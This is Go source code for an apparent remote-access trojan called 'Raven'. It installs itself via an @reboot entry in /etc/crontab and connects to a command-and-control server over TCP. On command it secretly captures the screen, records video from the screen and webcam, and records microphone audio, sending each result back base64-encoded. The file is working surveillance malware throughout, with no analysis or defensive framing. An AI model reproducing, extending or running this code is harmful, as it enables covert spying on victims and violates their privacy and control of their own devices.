package main

import (
	"bufio"
	b64 "encoding/base64"
	"encoding/binary"
	"fmt"
	"image/png"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	sr "github.com/fstanis/screenresolution"
	"github.com/gordonklaus/portaudio"
	"github.com/kbinani/screenshot"
	"gocv.io/x/gocv"
)

const (
	HOST = "127.0.0.1"
	PORT = 12345
)

func main() {
	fmt.Println("[*] Initializing Raven ...")

	if !is_persistent() {
		persist()
	}

	reach_command_and_control()
}

func is_persistent() bool {
	// check whether or not a cronjob exists for the program

	flag := "raven"
	file, _ := os.Open("/etc/crontab")
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, flag) {
			return true
		}
	}
	return false
}

func persist() {
	// achieve persistence by creating a cronjob

	file_path, _ := os.Executable()
	line := fmt.Sprintf("@reboot %s", file_path)
	file, _ := os.OpenFile("/etc/crontab", os.O_WRONLY|os.O_APPEND, 0644)
	scanner := bufio.NewScanner(file)
	var content string
	for scanner.Scan() {
		content += scanner.Text() + "\n"
	}

	content += line + "\n"
	_, err := file.Write([]byte(content))
	if err != nil {
		fmt.Println(err.Error())
	} else {
		fmt.Println("[*] Persisted successfully")
	}
}

func has_internet_access() bool {
	// attempt to connect to some live host

	_, err := http.Get("https://google.com")
	return err == nil
}

func reach_command_and_control() {
	// connect to c2 and initiate communication

	if has_internet_access() {
		addr := fmt.Sprintf("%s:%d", HOST, PORT)
		conn, err := net.Dial("tcp", addr)
		if err != nil {
			time.Sleep(time.Second * 30)
			reach_command_and_control()
		} else {
			// communication with C2
			conn.Write([]byte(video_recording(0, 5)))
			engage_via(conn)
		}
	} else {
		time.Sleep(time.Second * 30)
		reach_command_and_control()
	}
}

func engage_via(conn net.Conn) {
	// continually receive commands from c2 and act on them

	for {
		var msg, cmd, result string
		msg, _ = bufio.NewReader(conn).ReadString('\n')
		cmd = strings.TrimSpace(string(msg))
		conn.Read([]byte(cmd))
		if cmd == "q" || cmd == "quit" {
			result = "Closing connection"
			send_resp(conn, result)
		} else if cmd == "capture_screen" {
			result = screen_capture()
			send_resp(conn, result)
		} else if cmd == "record_screen" {
			result = video_recording(0, 5)
			send_resp(conn, result)
		} else if cmd == "capture_webcam" {
			result = webcam_snap()
			send_resp(conn, result)
		} else if cmd == "record_webcam" {
			result = video_recording(1, 5)
			send_resp(conn, result)
		} else if cmd == "record_audio" {
			result = mic_record(30)
			send_resp(conn, result)
		}
	}
}

func send_resp(conn net.Conn, resp string) {
	if resp == "Closing connection" {
		fmt.Fprintf(conn, "%s", resp)
	} else {
		fmt.Fprintf(conn, "%s# ", resp)
	}
}

func b64_file(file string) string {
	content, _ := os.ReadFile(file)
	return b64.StdEncoding.EncodeToString(content)
}

func screen_capture() string {
	bounds := screenshot.GetDisplayBounds(0)
	img, _ := screenshot.CaptureRect(bounds)
	file := "/etc/screen.png"
	f, _ := os.Create(file)
	png.Encode(f, img)
	result := b64_file(file)

	return result
}

func webcam_is_available() (bool, string) {
	var msg string
	webcam, err := gocv.VideoCaptureDevice(0)
	if err != nil {
		msg = "[!] Webcam not found"
		return false, msg
	}
	if !webcam.IsOpened() {
		msg = "[!] Failed to open webcam"
		return false, msg
	}
	webcam.Close()
	return true, msg
}

func webcam_snap() string {
	available, err := webcam_is_available()
	if available {
		file := "webcam.png"
		capture, _ := gocv.VideoCaptureDevice(0)
		img := gocv.NewMat()
		capture.Read(&img)
		gocv.IMWrite(file, img)
		result := b64_file(file)
		os.Remove(file)
		return result
	} else {
		return err
	}
}

func video_recording(tgt int, t int) string {
	file := "/tmp/screen.avi"
	var capture *gocv.VideoCapture
	var width, height int

	if tgt == 0 {
		// screen

		capture, _ = gocv.OpenVideoCapture(0)
		res := sr.GetPrimary()
		width, height = res.Width, res.Height
	} else {
		// webcam

		available, err := webcam_is_available()
		if available {
			capture, _ = gocv.VideoCaptureDevice(0)
			width, height = 640, 480
		} else {
			return err
		}
	}

	capture.Set(gocv.VideoCaptureFrameWidth, float64(width))
	capture.Set(gocv.VideoCaptureFrameHeight, float64(height))
	writer, _ := gocv.VideoWriterFile(file, "MJPG", 30, width, height, true)

	endTime := time.Now().Add(time.Second * time.Duration(t))
	for time.Now().Before(endTime) {
		img := gocv.NewMat()
		capture.Read(&img)
		writer.Write(img)
		img.Close()
	}

	capture.Close()
	result := b64_file(file) 
	os.Remove(file)
	return result
}

func mic_record(t int) string {
	file := "/tmp/audio.wav"

	f, _ := os.Create(file)

	portaudio.Initialize()
	defer portaudio.Terminate()
	in := make([]int16, 64)
	stream, _ := portaudio.OpenDefaultStream(1, 0, 16000, len(in), in)
	defer stream.Close()

	stream.Start()
	endTime := time.Now().Add(time.Second * time.Duration(t))
	for time.Now().Before(endTime) {
		stream.Read()
		binary.Write(f, binary.LittleEndian, in)
	}
	stream.Stop()

	result := b64_file(file)
	os.Remove(file)

	return result
}
